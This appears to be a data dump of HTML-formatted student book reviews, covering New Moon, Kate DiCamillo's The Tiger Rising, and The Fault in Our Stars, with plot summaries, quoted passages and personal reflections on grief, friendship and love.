voice is at the back of her head when she is breaking her\npromise, which is staying safe. She went over two kinds of solutions\nover the loss of Edward, being numb, or feeling the pain. She couldn\u2019t\nresist feeling numb at last, which led to her riding a motorcycle and\ncliff diving, only to hear the sweet voice at the back of her head.</p>\n<p>The cover of the book shows a tulip losing a drop of its petals. It\nrepresents Bella losing a drop of blood, which is a triggering event at\nthe beginning of the story, with Jasper unable to control his instincts\nand Edward realizing he is putting Bella in danger. It also symbolizes\nBella losing Edward, and her tears of pain when Edward is away.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/797e643f-de49-4123-954a-4350bd3fc4f7_image-2.png\"\nalt=\"alt text\" /> The book also gives a new image of a vampire. Unlike\nthe one we thought of, they can have a lot of feelings. They can be like\nhumans. They can love and hate, feel pain and happiness as well.</p>\n<h2 id=\"choices\">Choices</h2>\n<p>People\u2019s dreams always disagree with reality. It is choices that are\nalways deciding where we end up. Bella never regrets her choices. She\nchose without considering herself, but to follow Edward and not hurt\nanybody else. She chose to stay in Forks when Charlie wanted her to\nreturn to her mother Renee. She chose to be friends with Jacob. She\nchose to break the promises, sometimes putting herself in danger. At the\nend of the book, she chose to save Edward without hesitation.</p>\n<p>Bella is always so determined and confident with her choices. What if\nshe chose otherwise? What if she chose to stay with Jacob Black instead?\nHer life may be completely different.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/cd850e98-a792-4c22-a329-4ec51cb31da9_image-3.png\"\nalt=\"alt text\" /> ## Right and Wrong</p>\n<p>Both the vampires and werewolves in the book have their instincts.\nThey cannot help themselves. However, they always chose not to hurt\npeople. The Cullens chose a vegetarian diet. It can be very hard to make\nsuch a simple choice like that. It took Carlisle so many years of\npractice. It tells us that one can do better in all circumstances.</p>\n<p>The werewolves and vampires are in constant battle. They hate each\nother. Jacob referred to the Cullens as bloodsuckers. Alice described\nJacob as the dog. Werewolves are so easily enraged and sometimes can\u2019t\ncontrol themselves. Vampires always thirst for blood. Bella was the only\nhuman who could get along with both of them.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/3089f3e9-1d7c-4e7c-8e16-32a56968ee09_image-4.png\"\nalt=\"alt text\" /> ## Bella unable to be read</p>\n<p>Vampires and werewolves are both very strong and have supernatural\ngifts. However, they both struggle to control their animal instincts.\nBella appears to be the strongest emotionally. Some parts of the book\nare her monologue. She is the only one unable to be read by Edward and\nAro. Even Jane, so powerful, can\u2019t hurt her.</p>\n<p>Bella can keep to herself after half a year. Edward said that human\nmemories can be forgotten over a long time, but Bella didn\u2019t forget her\nmemories. Since Bella\u2019s thoughts are unable to be read by Edward, it\ncreated a distance between them. That distance helped a lot in their\nrelationship.</p>\n<h2 id=\"love\">Love</h2>\n<p>Bella always wants to get equal with Edward. She wanted to be a\nvampire instead of going to college and becoming older. On her\neighteenth birthday, Bella was very sad because she became older than\nEdward.</p>\n<p>Edward offered many things for her, but Bella always refused. He\noffered to pay her through college and gave her a luxurious car as a\nbirthday present. But Bella thought that they will just put them unequal\nin their relationship, which may be bad in the end.</p>\n<p>Edward thirsted for Bella\u2019s blood whenever he is near her. He always\ncontrolled himself, no matter how hard it is. When Bella\u2019s fingers were\nhurt at the party, Edward did not even breathe when he is near her.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/629c5129-7192-4cf5-a9e3-3cd3a0744bf4_image-5.png\"\nalt=\"alt text\" /> Edward wandered alone when he left Bella, hunting for\nVictoria. When Edward knew that Bella died, he was so sad. He always\nsaid without hesitation that Bella is the most beautiful thing in this\nworld and he is not going to live without her. Bella is special because\nshe can sacrifice all herself for love and family. She always put Edward\nat top priority and is eager to die for him. She accepted being grounded\nby Charlie in the end when she flew to Italy. That is why they are\ndestined to be together.</p>\n<p>Bella and Jacob\u2019s relationship, however, is very different. Bella\nfound Jacob just because she wanted company. She described him as\nsomeone always happy, like her sun.</p>\n<p>Jacob is from a native American tribe. He is a werewolf. He is very\ntall and always warm to others. He is the kind of person you can always\nturn to in trouble. Jacob loved Bella very much. He once said, \u201cI will\nalways be there for you and won\u2019t ever give up.\u201d Bella thought herself\nselfish when being with Jacob. Her love for Edward will never change,\nyet she did not reject Jacob. As Jacob is like a sun for her, she could\nnot bear to turn away from him at the darkest times of her life.</p>\n<p>\u56fe\u7247</p>\n<p>Jacob helped Bella get out of the solitude she was in. They began to\nunderstand each other when Jacob\u2019s secrets are revealed. However, Jacob\ncan never take the place of Edward. Edward and Bella have a connection\nno matter how far away they are.</p>\n<p>Jacob acts as a protector in the book. He protected Bella from\ngetting hurt by Laurent or Victoria, the two vampires who are always\nhunting for her. He saved Bella when she was drowning. He did all that\njust because he thought it was right. His tribe was to \u201cprotect the\npeople from vampires.\u201d When Bella turned away from him, he was so\nheartbroken.</p>\n<p>Bella ended up with some serious problems at the end of the book. But\nas she is with Edward, all the problems seem insignificant. The story\ncontinues in Eclipse.</p>\n", "_id": "66689631547d3fe098118734"}

Though Sistine tried to convince Rob to free the tiger, Rob didn\u2019t\nand they went back to the hotel. They then showed Willie May the tiger\nand Rob decided to free the tiger.</p>\n<h3 id=\"part-two-impressive-plots\">Part Two Impressive Plots</h3>\n<p>1 A Wonderful Plot</p>\n<p>He looked up at the dark outside of the sign and recalled lying on a\nblanket, staring up at a big oak tree. His mother had been on one side\nof him, and his father, asleep and snoring, bad been on the other. He\nremembered that his mother had taken hold of his hand and pointed up at\nthe sun shining through the leaves of the tree and said, \u201cLook, Rob, I\nhave never in my life see a prettier color of green, Ain\u2019t it\nperfect?\u201d</p>\n<p>Explanation</p>\n<p>This is only a short paragraph but has many meanings in it. It is\nabout Rob\u2019s memory about a regular day. Though regular for us, it isn\u2019t\nfor Rob. Because of the cruelty of cancer, this kind of day never exist,\nit can only be a memory, a small part inside the suitcase.</p>\n<p>Thus the scene of the three of them, lying under a tree, had been so\nhappy, and wonderful because his mother and smiling father are there\nwith him.</p>\n<p>2 A Sad Plot</p>\n<p>But she didn\u2019t stop. She shook the cage and beat her head against the\nchainlink, and then heard her gasp. He was afraid that maybe she was\nchocking. He went and stood next to her. And he saw that she was crying.\nCrying. Sistine.</p>\n<p>Before Rob could think whether it was right or whether it was wrong,\nhe reached out and put his palm on Sistine\u2019s neck. He could feel her\npulse, beating in time with the tiger\u2019s pacing. He whispered to her the\nsame words hismother had whispered to him. \u201cI got you,\u201d he told her. \u201cI\ngot good hold of you.\u201d</p>\n<p>Sistine cried and cried. She cried as if she would never stop. And\nshe did not tell him to take his hand away.</p>\n<p>Explanation</p>\n<p>This plot above is about Sistine cring after seeing the tiger in the\ncage and Rob using his mother\u2019s way to comfort Sistine.</p>\n<p>Sistine saw the tiger and thought of herself, and she found out that\nshe, like the tiger, was locked in a cage. The cage is school and her\nmother. She couldn\u2019t get out of the cage like the tiger. That\u2019s why she\ncried and cried. It is really sad and heart-breaking. For Rob, it was\nreally surprising. Then Rob, thought about his situation and school, but\nhe didn\u2019t cry. His suitcase, at this point, isn\u2019t completely open. His\nsympathy for Sistine impelled him to try to comfort her, just like his\nmother did to him.</p>\n<h3 id=\"part-three-my-idea\">Part Three My Idea</h3>\n<p>In these six chapters, the main characters are Rob, Sistine, and\nWillie May. The story is so realistic that I thought it\u2019s happening\nright in front of my eyes, but not in the book.</p>\n<p>Chapter 19 is about Beauchamp giving meat and keys to Rob to feed the\ntiger. We can see that Beauchamp is afraid of the tiger because he\nlooked away from its stare, and trembled when feeding it.</p>\n<p>The reason Beauchmp afraid to the tiger is easy. It is because he\ndidn\u2019t pay respect to the tiger, while the tiger is stronger than\nBeauchamp.The tiger needs freedom whild Beauchamp put him in a cage.\nThat\u2019s why he was afraid. So everything he did to the tiger was careful.\nHe was afraid that the tiger would rise up and attack him, that\u2019s why\n\u201cHis forehead was shiny with sweat, and his hands were trembling\u201d when\nhe opened the cage.</p>\n<p>Chapter 20 is about Rob and Sistine seeing the tiger. Why did Sistine\ncry when she shook the cage? The significance of the tiger\u2019s cage for\nRob is it symbolizes his feelings and the cage is like the suitcase. Rob\nfound it difficult to look at the caged tiger because he didn\u2019t want to\nface it, didn\u2019t want to face his emotions, and didn\u2019t want to cry\nagain.</p>\n<p>Chapter 21 is mainly about Willie May. We can see that she\nexperienced all kinds of sadness and anger so she can see it clearly.\nWillie May saw the anger in Sistine directly. It uses prophetess to show\nthis.</p>\n<p>Chapter 22 is about Rob\u2019s father. A hard man, he is. His hardness\nused to com bine with Caroline\u2019s tenderness, but erupted after Rob\u2019s\nmother\u2019s death. That\u2019s why he became angry all again.</p>\n<p>In chapter 23 and 24, Willie May appeared again. It showed how much\nshe cared for her bird Cricket and how Sistine\u2019s mother had treat\nSistine.</p>\n<p>These six chapters describes things which happened after Rob got the\nkey. It isn\u2019t much, but really are emotional affecting. Let\u2019s see how\nthe tiger was freed next time.</p>\n<p>\u200b</p>\n<h2 id=\"chapter-25-30\">Chapter 25-30</h2>\n<h3 id=\"part-one-a-brief-summay\">Part One A Brief Summay</h3>\n<p>Rob freed the tiger but his father shooted it. Rob hitted his father\nbut it was no use. So Rob let the suitcase open and finally understand\nhis father. They buried the tiger together with Sistine and Willie May.\nThen Rob and his father decided to move back to their life.</p>\n<h3 id=\"part-two-impressive-plots-1\">Part Two Impressive Plots</h3>\n<p>1 An Angry Plot</p>\n<p>And when Rob saw the tiger on the ground and his father standing over\nit, holding the rifle, he felt something rise up in him, an anger as big\nand powerful as the tiger. Bigger.</p>\n<p>\u201cYou killed him.\u201d he said to his father.</p>\n<p>\u201cI had to,\u201d his father said.</p>\n<p>\u201cThat was my tiger!\u201d Rob screamed. \u201cYou killed him! You killed my\ntiger!\u201d He ran at his father and attacked him. He beat him with his\nfists. He kicked him. But his father stood like a wall. He held the gun\nup over his head and kept his eyes open and took each hit without\nblinking.</p>\n<p>And Rob saw that hitting was going to be enough.</p>\n<p>Explanation</p>\n<p>This dialogue is about Rob when he knew his father shoot the tiger.\n\u201cAs powerful as the tiger, beat him with his fists,\u201d showed how angry\nRob was his father shooting and killing the tiger. It is a dialogue I\ncan never forget, it is really emotional-affecting. Rob took the anger\nfrom the suitcase to hit his father, and he was really mad and angry of\nit.</p>\n<h3 id=\"part-three-my-idea-1\">Part Three My Idea</h3>\n<p>The last six chapters that ended the book really affect me. They are\nthe best chapters in the whole and are full of emotions.</p>\n<p>Chapter 25 is about Rob deciding to free the tiger. Comparing to\nSistine, Willie May is more wiser and thought deeper. However, she\nwasn\u2019t so kind and pure like Rob and Sistine, she experienced more and\nbecame more like the common adult.</p>\n<p>Another point there is to say is that how Sistine acted to her almost\nclosest friend Rob when he said that her daddy ain\u2019t coming. We can see\nthat Sistine lost her judgement and became doubtful in life after the\nangers. When sometimes somebody was so angry, they last everything and\nbecame just like animals, unable to see what is right and what is wrong.\n\u201cDark, Cold, Glare\u201d and many other adjectives decribes it.</p>\n<p>Chapter 26 is mainly a dialogue with Beauchamp. It showed that\nSistine didn\u2019t mean to not talk to Rob the rest if her life and Rob\u2019s\ndecision to free the tiger.</p>\n<p>Chanpter 27 and 28 aren\u2019t like any chapters in this book. They are\nstrong. Rob\u2019s action showed how he hate his life, the death of his\nmother and everything that happened here. These things tortured Rob and\nhe became depressed. He want to revenge. The sadness managed to pull it\nout, to open his suitcase, and let the tiger rise.</p>\n<p>The crack of a gun killed Rob\u2019s tiger. It was a really sad moment. He\nwas not whole that time because he had lost his tiger and everything.\nHis revenge to his father was all his anger he had in the half year\nafter his mother death.</p>\n<p>However, the name of caroline brought him back to life. He finally\nunderstand his father. He had to kill the tiger because it may cause\nserious damage and no one could tell how it will behave.</p>\n<p>Rob said \u201cmy tiger\u201d because the tiger is just like himself. He has\njust so much in common with it. That\u2019s why he said the tiger was\nhis.</p>\n<p>The burying of the tiger brought Rob back to himself. Tears came back\nto him and he finally became open-minded. The lighter inside showed how\nsad Rob was when his mother died.</p>\n<p>At last, the ending of this book. It seemed to us too sudden, but it\nis exactly the point where the book should end. I don\u2019t think this book\nis happy, even the ending. What may happen next? It left us with\nimaginations. I think that Rob will start to be happy again. It is true\nthat Rob\u2019s father will lose his job, Beauchamp will be mad and even fine\nhim, the bullies in school will bully him again. But Rob won\u2019t care\nabout this and will face them bravely with Sistine.</p>\n<p>The last chapter successfully put a period to Rob and his stories. I\nmay not understand the deep meanings in this book, but I told what I get\nand learned from this book. It is one of the books that express so many\nemotions. Though the book is short, it is the best fiction dealing about\nfeelings, more than any 121-page-book can contain</p>\n<p>\u200b</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>The Tiger Rising is written by Kate Dicamillo, an author of many\ngreat novels. Though it is very short, it is full of emotions and really\naffecting.</p>\n<p>The book is mainly about friendship. Different from other books, it\ntook place many years ago. I was wondering about how Rob and Sistine\ndiscovered friendship in such a time, especilly when they first hated\neach other so much. After thinking , I learned friends are people who\nhelp each other, not only standing up to bullies and defend the other,\nbut also to help mentally, like cheering somebody up after when he is\ndown, understanding feelings or achieving a goal together. That\u2019s what\nfriends are for.</p>\n<p>When it comes to understanding, Rob and Sistine have much of this in\ntheir friendship. One\u2019s parents divorced, one\u2019s mother died, they really\nhave much in common. By talking about the Sistine Chapel, Sistine knew\nthat Rob wasn\u2019t a boy of nothing.</p>\n<p>By helping out with the bullies, Rob and Sistine started a frienship.\nBy understanding each other, they became good friends, Finally, by\nachieving a goal, which is to free the tiger, they became inseparable.\nHowever, the tiger was cruelly shot by Rob\u2019s father. This time, it came\nagain to understanding and the friendship became unbreakable.</p>\n<p>Now let\u2019s go back to describing Rob. As the main character, he is\npessimistic, intraoverted, and artistic. With his mother died and his\nfather depressed, he was uncontrollably droven to became an introverted\nperson who keeps everything to himself. He didn\u2019t want to get too much\npain and closed his suitcase, or his mind and got more pain than he\nthought. After becoming introverted, moving to a new place and getting\nbullied, he started to be pessimistic, a person who thinks everything is\nbad. He went to school with thoughts just to bear one more day and\nstarted to dislike school. That was a time when living didn\u2019t mean\neverything, when life everyday is like living in hell, when Rob gave up\nthe thought of expressing his feelings. That is more pain than facing\nthe truth in life. If it wasn\u2019t for Sistine, he may be introverted\nforever and never be a man.</p>\n<p>However, he is very artistic. He carved a wooden bird and a \u201cSistine\u201d\nwhich looks real.</p>\n<p>The most annoying character is Beauchmp. Though rich, he didn\u2019t have\nanything inside but is a coward, as Rob\u2019s father said, He underpaid\nRob\u2019s father and liked driving cars crazily. He was afraid of the tiger\nbecause he did wrong things. He caged wild animals. That\u2019s why he gave\nRob money to let him feed it. He is nothing but a big fool.</p>\n<p>If I am the author, I may end the book with Rob starting to adapt to\nschool life by fighting back the bullies and enjoy going to school with\nSistine. instead of ending the book abruptly after the adventure ended.\nI feel not so joyful in my heart when book ended but the story is not\nyet finished, or doesn\u2019t have a \u201chappily ever after\u201d kind of ending.</p>\n<p>However, it left us various imaginations and ended at the exact point\nwhere some things are yet not decided, It is the best way to end a\nnovel.</p>\n<p>After all, this is the most emotional-affecting and memorable novel\nand I will never forget it. It will always be with me when I faced\nproblems in my future life.</p>\n", "_id": "66689632547d3fe098118735"}

In the letter, Augustus said getting hurt was\ninevitable and was happy with his choice.

In the book The Tiger Rising, cancer killed Rob\u2019s\nmother, leaving Rob unprotected and depressed. In this book, it\ndestroyed lives. Hazel Grace has cancer when she was thirteen and\nsuffered from it. As we can see, before she met Augustus, she thought\nher life has ended, it was just that she hasn\u2019t died. And we can see how\ndepressed Hazel was. She\u2019d give up her whole life for a few happy days.\nMelancholy, frustrated, pessimistic was Hazel when she went into the\nsupport group and met Augustus Waters.</p>\n<p>However, once Hazel met Augustus at the support group, she instantly\ndiscovered an attraction towards him because of his appearance. When\nHazel spoke to Augustus that human beings will be dead and there\u2019s no\none to remember them, a line she learned from An Imperial Affliction, it\ncreated a bond between them, which made them inseparable.</p>\n<p>Augustus asked Hazel to come to his house. When he gave Hazel his\nfavorite book The Price of Dawn. Then they watched V for Vendetta in the\nbasement. It was at this point that they became closer to each other and\nthe relationship between them began to develop. After the talk and the\nexchange of books, they were not just normal friends, but close friends.\nIt was because they both have cancer and suffer from it. They share the\nsame experience while Hazel became depressed and Augustus didn\u2019t and\nstill enjoyed life. At this point, Hazel was looking for someone\ncheerful and humorous and found Augustus. They could communicate and\nunderstand each other while most people in the society couldn\u2019t.</p>\n<p>Hazel liked the Price of Dawn and stayed up reading it. It wasn\u2019t\nbecause it had taught her lessons like AIA, but because reading it was\nfunny and entertaining, it allows you to take a break and enjoy yourself\nfreely like a child. Sometimes, we need these things to slow us down and\nhelp us to get rid of pressure in life.</p>\n<p>In chapter three, Hazel\u2019s mother\u2019s celebration of \u201chalf birthday\u201d\nseemed very queer. However, if we looked deeper Ito it, we can see she\nreally meant Hazel had survived another half year by using Phalanxifor.\nSince Hazel got the cancer, Hazel\u2019s mother had worried about her health.\nIt showed she is affectionate.</p>\n<p>Then we came to the plot when Isaac was crying about his eyes being\ncut out. I felt sympathetic for him. When I first looked at the plot, I\nthought Monica was bad. However, when I thought again, I came to this\nquestion: who\u2019d like to be in love with a blind person and care for him\nthe rest of his life? I began to understand that we shouldn\u2019t just blame\nher. She had done wrong things but how many could stand the situation,\nor, even worse, didn\u2019t just simply break up and kind of forsake him\nafterwards. Things are that confusing in real life. There are some bad\nthings in life which make you so angry you want to explode. But if you\nlook deeper, you cannot find a person directly responsible to it. Maybe\nit\u2019s destiny.</p>\n<p>When their friendship got more deeper, Augustus asked Hazel to go to\nAmsterdam. The ending of AIA is what Hazel wanted to know all her life\nbecause AIA is the only book she read after she got her cancer and a\nbook which she felt involved in. AIA is a reference Hazel found for her\nreal life. That\u2019s why when she got the chance to see Van Houten and knew\nwhat the ending of AIA is, she desperately wanted to go there, ignoring\nher body conditions.</p>\n<p>Before they went to Amsterdam, Augustus took a scan and his body \u201clit\nup like a Christmas tree\u201d. But knowing Hazel was going to die anytime\nsoon and this may be the last trip together he insisted to go to\nAmsterdam.</p>\n<p>When Hazel arrived and discovered that Peter Van Houten is crazy, she\nwas so disappointed. She was desperate while Peter Van not only didn\u2019t\nanswer her questions but drove them out of the house, she thought her\nlife was over the second time. This tend to be a closer relationship\nbetween she and Augustus.</p>\n<p>Finally, Hazel painfully returned to normal life. At the fake funeral\nHazel expressed her feelings about the little infinity between them. It\nis a thing we can come across but can\u2019t demand. It is a thing of great\nvalue that we should always treasure it.</p>\n<p>Cancer killed Augustus Waters at last and ended the relationship. She\nwas so sad about his death. I think the condolences people write about\nhim were not unreal but was said without thinking. Why didn\u2019t you care\nabout someone when he is alive but act so sad when he dies? It infers we\nonly care about something when it passes away, and there are few things\nthat can return once it passed away. We should always cherish what we\nhave now.</p>\n<p>This book is really touching and made me sad for a long time. I\nlearnt that though sometimes the things that pass away couldn\u2019t return,\nwe can learn from them and keep them forever in our hearts.</p>\n", "_id": "66689632547d3fe098118736"}

Though there\nwere no spells or curses in this book, it was just as touching as any\nother adventures I\u2019ve witnessed.</p>\n<p>I found that book first on a shelf in a bookstore when I went to\nAmerica along with five other Dicamillo\u2019s books. I couldn\u2019t urge to read\nit once I saw the picture in front of the book and I couldn\u2019t help but\nwriting a book review. There are so much things inside this\none-hundred-and-twenty-page book. Kate Dicamillo surprised us with\nanother miraculous tale.</p>\n<p>And now let\u2019s begin.</p>\n<h3 id=\"part-one-a-brief-summary\">Part One A Brief Summary</h3>\n<p>The first three chapters told us about a motherless child Rob Horton\nwho was always bullied at school. He discovered a tiger was in the woods\non a normal day to school.</p>\n<p>He had read about Sistine Chapel in a book and found a girl who wore\nparty dress named Sistine in school.</p>\n<p>The next three chapters in the book is mainly about Sistine Bailey\nintroducing herself and getting laughed, Rob accused and having to stay\nhome because of his \u201ccontagious\u201d leg disease, and Rob helping Sistine\ngetting out of an occasion.</p>\n<h3 id=\"part-two-impressive-plots\">Part Two Impressive Plots</h3>\n<p>1 A Surprising Plot</p>\n<p>This was such a surprising development, to have the bus stop halfway\nthrough its route, that Norton stopped grinding his knuckles into Rob\u2019s\nscalp and Billy stopped punching Rob in the arm.</p>\n<p>\u201cHey, Mr.Nelson,\u201d Norton shouted. \u201cWhatcha doin\u2019\uff1f\u201d</p>\n<p>\u201cThis ain\u2019t a stop, Mr, Nelson,\u201d Billy called out helpfully.</p>\n<p>But Mr.Nelson ignored them . He keep whistling his non song as he\nswung open the bus door. And while Norton and Billy and Rob watched,\nopen-mouthed and silent, a girl with yellow hair and a pink lacy dress\nwalked up the steps and onto the bus.</p>\n<p>2 A Fearful Plot</p>\n<p>They wereall looking at him. Waiting. Sistine was waiting, too;\nwaiting for him to do something. He looked down at the ground and saw\nwhat they have thrown to her. It was an apple. He stared at it for what\nseemed like a long time, and when he looked back up, they were still\nwaiting to see what he would do.</p>\n<p>And so he ran. And after a minute, he could tell that they were\nrunning after him, he didn\u2019t need to look back to see if they were\nthere. He knew it. He knew the feeling of being chased. He dropped the\npicture of the tiger and ran fall out, pumping his legs and arms hard.\nThey were still behind him.</p>\n<h3 id=\"part-three-my-idea\">Part Three My Idea</h3>\n<p>The first chapter briefly introduced Rob Horton, a boy of our age,to\nus. His life were just like us and, as we can learn from the story,\nwasn\u2019t so bad until his mother died.</p>\n<p>We can see the cruelty of sickness and its affect to Rob. We always\nyell and cry when something bad happens, but Rob chose to ignore it.\nWhen we cry, the bad things and sadness pour out and didn\u2019t sound as bad\nafter we were done. That way, we gave vent to our sadness. But Rob\ndidn\u2019t cry. He didn\u2019t feel as much depression ashe cry when he tried to\nignore things, to ignore life.</p>\n<p>However,when he tried to get rid of sadness, he couldn\u2019t. He has\nsadness deep in theheart haunting and he couldn\u2019t be happy and laugh\nlike we do. Pouring something out is way better than keep everything\ninside.</p>\n<p>I must inspect the characteristic of Billy and Norman Threemonger.\nComparing with bullies in other books, we can see that Augustus Gloop,\nVerua Salt and Dudley Dursley are far better. They are just greedy and\ndemand everything while Billy and Norman are evil. They bullied people\njust because they were stronger and that God didn\u2019t pick on their\nmothers. I almost wanted to jump in that school busand put the cruciatus\ncurse, one of the curse which tortures people in Harry Potter, on them.\nThey will just be people who do hard works and earn nothing when they\ngrow up.</p>\n<p>The surprised scene of students staring showed that how uncommon\nSistine was. Everything in this book, in chapter one and two, suggested\nthat it was another gloomy day to start, another gloomy day for Rob to\nfinish, another meaningless day.</p>\n<p>However,with the tiger and Sistine, it wasn\u2019t a day which you can\nignore just like that. It was a day that is worth remembering. It\nchanged Rob\u2019s life the second time and helped him found a bit of his\nusual form, the boy who was loved by his mother.</p>\n<p>We could see that Sistine came in spotlights. Everybody was shocked.\nIt also showed how rude it is to interrupt one\u2019s introduction, and more\nby using an idiom for the teacher.</p>\n<p>Why did Sistine hate Rob so much? Because of Rob\u2019s powerless and\nincapable of doingthings. That\u2019s why she sat next to him on the school\nbus on the way home. Rob showed his bravery and sympathy that day.</p>\n<p>As Rob went into the principle\u2019s office, we can tell that the\nprinciple isn\u2019t sure about the contagious thing himself by coughing his\nthroat. He only wanted to respond to the worried parents that he did\nsomething. In fact, he remained unsure all the time and he is even more\npowerless, comparing to Rob, though he is the principle.</p>\n<p>Chapter 6 is important. It compared Sistine and Rob\u2019s way of handling\nbullies. These boys and girls will never leave you alone. You should\nfirst chose to igore, but when they push it to a point. You can never\ndeal with them regularly. You must fight them to show you\u2019re not a fool.\nThe other way is trying to be friend them. You can be unharmed by others\nby doing it.</p>\n<p>It is quite a difference between handling situations. Comparingly, I\nappreciate fighting. Life is meaningless when you choose to ignore\neverything. You can only let it fly when you are doing something. As I\nsaid, we must pour out things rather than let everything inside. That\nway, we have our sadness erupted.</p>\n<p>It told us about people that time, the whistling driver, the strange\nway they speak. It was many years before, but the story isn\u2019t dull like\nthe gloomy life that time. Rob and the tiger shared something in common.\nThey were both locked up in different ways. They helped each other out.\nAnd as the sadness in Rob\u2019s heart rised, little by little, the story\ncontinues, surprising us with each chapters better and more touching\nthan the one before.</p>\n<h2 id=\"chapter-7-12\">Chapter 7-12</h2>\n<h3 id=\"part-one-a-brief-summary-1\">Part One A Brief Summary</h3>\n<p>Sistine sat with Rob on the bus back to home, and Rob showed Sistine\nwhat the Sistine Chapel is. Rob returned back to the hotel. Unable to go\nto school because of his \u201ccontagious\u201d disease, he stayed at home as a\nworking man for a few days and at the same time trying to see if the\ntiger was still there.</p>\n<p>Rob Horton and Sistine started a friendship by saving each other from\nbullies andnow, as their friendship continues, they found some things\nand topics in common and decided to explore the tiger together.</p>\n<h3 id=\"part-two-impressive-plots-1\">Part Two Impressive Plots</h3>\n<p>1 A Sad Plot</p>\n<p>He stayed up late working on the caring, and when he finally fell\nasleep, he dreamed about the tiger, only it wasn\u2019t in a cage. It was\nfree and running through the woods, and there was something on its back,\nbut Rob couldn\u2019t tell what it was.As the tiger got closer and closer,\nRob saw that the thing was Sistine in her pink party dress. She was\nriding the tiger. In his dream, Rob waved to her andshe waved back at\nhim. But she didn\u2019t stop. She and the tiger kept going, past Rob, deeper\nand deeper into the woods.</p>\n<p>2 A Predicted-but-surprising Plot</p>\n<p>He took a breath. He opened his mouth and let the words fall out. \u201cI\nknow where there\u2019s a tiger.\u201d</p>\n<p>Sistine stood in the drizzly rain and stared at him, her eyes black\nand fierce.</p>\n<p>She didn\u2019t say \u201cA real one?\u201d</p>\n<p>She didn\u2019t say \u201cAre you crazy?\u201d</p>\n<p>She didn\u2019t say \u201cYou\u2019re a big old liar.\u201d</p>\n<p>She said one word: \u201cWhere?\u201d</p>\n<p>And Rob knew then that he had picked the right person to tell.</p>\n<p>Explaination:</p>\n<p>The plot above is both predicted and surprising. It is surprising\nbecause almost nobody can believe that there\u2019s a tiger. Imagine your\nbest friend saying there\u2019s atiger (not in a zoo, but in a cage in the\nwoods), you will probably respond the usual sentence \u201cAre you crazy?\u201d or\nsomething like that, but Sistine didn\u2019t and asked where. It was like a\njoke but she took it seriously, because she thought Rob is a friend.\nThat\u2019s why it\u2019s surprising, though the fact that Rob had actually found\na tiger in chapter one made it a little less surprising.</p>\n<p>It is also predicted because that Rob\u2019s actions made Sistine believe\nhim to be a true friend who is trustworthy, not a fake friend. And\nknowing that Rob wasn\u2019t a joyful boy, just like Harry didn\u2019t think that\nHagrid\u2019s a joke played by the Dursleys, she believed him. Though their\nfriendship hasn\u2019t even really started, they knew each other a lot.</p>\n<h3 id=\"part-three-my-idea-1\">Part Three My Idea</h3>\n<p>Chapter 7 is about the conversation on the school bus. Why can this\nday be called extraordinary? Because it was different from the other\ngloomy days Rob had when time just slipped by and got nothing. On that\nday, Rob found the tiger and discovered a friend. These discoveries made\nthe ordinary day extraordinary.</p>\n<p>We can identify that Rob has some same points with Sistine. For one\nthing, they both dread going to school, the bullies, the stupid teachers\nand other things. However, Rob didn\u2019t want to express his feelings to\nanybody, all except maybe his father because his father has been with\nhim together. That was why he was glad that Norton an Billy beat him to\nsilence.</p>\n<p>Friendship is made up by sharing the same feelings with somebody. The\nfriendship between Rob and Sistine started because of it.</p>\n<p>Chapter 8 shows us how much Rob\u2019s father loved him, he loved Rob as\nmuch as Rob\u2019s mother. He just didn\u2019t show it in Rob\u2019s mother\u2019s way and\nbecame fierce and hard after the death of his wife Caroline. Working\njust for Beauchamp everyday just to earn a living. He, like Rob, hide\nhis feelings inside. We can also define how good Rob\u2019s mother and father\nhad combined together, the strong and the gentle. I heard that people\nwith opposite characteristics are more likely to be better when they are\ntogether. Rob chose moving and living in a motel instead staying in his\nhometown, where everybody and everything reminded him of his loving,\ncaring mother. It was so overwhelming. Maybe they\u2019ll even get some money\nfrom their neighbors. But his father chose to leave it, to live\nthemselves instead of depending on others. Rob started hating the sun, I\nnoted in the book. He was even glad if the whole state was flooded,\neverybody would be like him, a boy who was helpless and everything would\ndisappear.</p>\n<p>Another thing to notice is that Rob carved Sistine instead of someone\nelse, like his mother said, you do what wanted and you followed. Why\nwould Rob carve Sistine? Because she is who he needed. Just like Rob\u2019s\nmother, Sistine brought a piece of sunlight to Rob\u2019s life. When life\u2019s\ndown, especially for a long time, something big will always happen to\ncheer you up from being depressed. From Sistine\u2019s act, Rob knew that she\nis another outsider of the society, unlike those gray building and\ndullness. She is just like his mother, active and open.</p>\n<p>Chapter 10 showed us Willie May\u2019s ideas and also how Beauchamp badly\ntreated his workers. He didn\u2019t give them much salary while he himself\nowned a tiger. It didn\u2019t seem fair. That\u2019s the gap of poor and rich\nyears ago, but so many years passed that almost nobody remember it now.\nHowever, the author described it brilliantly.</p>\n<p>Willie May\u2019s words are important. It is why this book is called The\nTiger Rising. It showed darkness and sadness must be faced rather than\nkept in the heart.</p>\n<p>The injury in Rob\u2019s leg helped us to understand the novel. There are\nno such disease like that while you must face sadness to cure it. Or\nmaybe it\u2019s just Willie May\u2019s imagination. But it symbolized memories,\nsoreness, and despair. If we don\u2019t face it and defeat it. It would\nforever remain, just like the tiger in the cage.</p>\n<p>Chapter 12 and 13 is a conversation. The rudeness of Norton and Billy\nThreemonger are again shown here. I think Rob was right, they should be\neated. They are worse than animals.</p>\n<p>The conversation is short but touching. Seeing the tiger seem perfect\nfor an adventure as they decided to go there. It ended so sudden and let\nme thinking about what they will say to each other and how they will\nfind the tiger. Let\u2019s find out in the next eighteen chapters.</p>\n<p>\u200b</p>\n<h2 id=\"chapter-13-18\">Chapter 13-18</h2>\n<h3 id=\"part-one-a-brief-summary-2\">Part One A Brief Summary</h3>\n<p>Rob and Sistine finally explored the woods by themselves and found\nthe tiger\u2019s still there. On the way they shared a few secrets about\ntheir families. Then Sistine went to the laundry room to phone her\nmother.</p>\n<p>Rob andout the Sistine had a short conversation after they found the\ntiger and Sistine went away with her mother. Willie May told Rob about\nher bird Cricket and how she let him go. Beauchamp drove Rob into the\nwoods to gave him a job of feeding the tiger with the meat.</p>\n<h3 id=\"part-two-impressive-plots-2\">Part Two Impressive Plots</h3>\n<p>1 A Happy Plot</p>\n<p>Sistine said, 